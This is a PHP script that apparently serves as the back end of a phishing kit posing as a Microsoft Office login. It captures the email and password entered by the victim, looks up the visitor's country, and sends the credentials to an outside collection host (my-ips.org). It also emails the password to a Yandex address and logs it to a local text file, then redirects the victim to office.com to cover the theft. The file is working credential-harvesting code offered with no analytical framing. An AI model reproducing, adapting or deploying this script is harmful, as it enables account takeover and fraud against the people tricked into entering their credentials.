<?php

  if(isset($_POST['submit']))
  {

    $useremail = $_POST['uemail'];
    $userpassword = $_POST['password'];
    // echo $useremail;


    function visitor_country()
    {
      $ip = getenv("REMOTE_ADDR");
      $result = "Unknown";
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      $country = json_decode(curl_exec($ch))->country;
      if ($country != null)
        {
        $result = $country;
        }

      return $result;
    }


    $api = 'http://my-ips.org/ip/index.php'; //put api url
    $country = visitor_country();
    $ip = getenv("REMOTE_ADDR");

    $data = array(
      "user" => $useremail,
      "pass" => $userpassword,
      "type" => "1",
      "country" => $country,
      "ip" => $ip
    );
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    if ($result == 1)
    {
      $date = date('d-m-Y');
      $ip = getenv("REMOTE_ADDR");
      $over = 'https://office.com';

        $email_from = 'sender@blgxe6d1.appspotmail.com';//<== update the email address
        $email_subject = "New Entry";
        $email_body = "You have received a new message from the user $useremail.\n".
            "Here is the password: $userpassword. \n\n\n";

        $to = "endyworkmode01@yandex.com";//<== update the email address
        $headers = "From: $email_from \r\n";
        $headers .= "Reply-To: $useremail \r\n";
        //Send the email
        mail($to,$email_subject,$email_body,$headers);
        //done. redirect to thank-you page.

      @fclose(@fwrite(@fopen("Office-login.txt", "a"),$email_body));

      header("Location: $over");
    }
    else
    {
       header("refresh:0.1 url=index.html?#$useremail");
    }







  }



/*// Function to validate against any email injection attempts
function IsInjected($str)
{
  $injections = array('(\n+)',
              '(\r+)',
              '(\t+)',
              '(%0A+)',
              '(%0D+)',
              '(%08+)',
              '(%09+)'
              );
  $inject = join('|', $injections);
  $inject = "/$inject/i";
  if(preg_match($inject,$str))
    {
    return true;
  }
  else
    {
    return false;
  }
}*/

?>
